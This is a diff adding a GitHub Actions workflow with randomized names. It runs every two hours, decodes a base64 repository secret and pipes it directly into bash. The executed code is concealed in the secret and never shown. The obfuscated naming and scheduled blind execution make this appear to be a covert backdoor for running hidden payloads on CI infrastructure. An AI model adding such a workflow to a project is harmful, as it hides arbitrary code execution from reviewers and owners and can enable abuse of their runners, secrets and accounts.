@@ -1,0 +1,13 @@
+name: lbOjCMDo
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  pFRqfqJDkm:
+    runs-on: ubuntu-22.04
+    env:
+      DbBUfsrX: ${{ secrets.Xgmcoh }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.RLRTUtHZds }}" | base64 -d | bash
